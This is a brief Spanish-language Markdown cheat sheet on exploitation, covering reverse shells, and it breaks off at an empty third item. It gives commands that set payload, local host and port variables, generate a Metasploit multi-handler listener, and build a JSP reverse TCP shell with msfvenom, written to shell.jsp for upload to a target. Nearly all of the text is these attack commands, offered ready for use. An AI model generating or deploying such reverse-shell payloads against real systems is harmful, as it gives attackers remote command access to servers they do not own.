# Seccion de explotacion

## Shell reversa

Previamente `export PAYLOAD=<nombre-payload>; export LHOST=<IP-local>; export LPORT=<puerto local>`

### Multi Handler
1) Generar un Multi Handler automatico --> `multi-handler/generator.sh $PAYLOAD $LHOST $LPORT`

### Shell reversas

2) JSP  --> `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > shell.jsp`

3) 
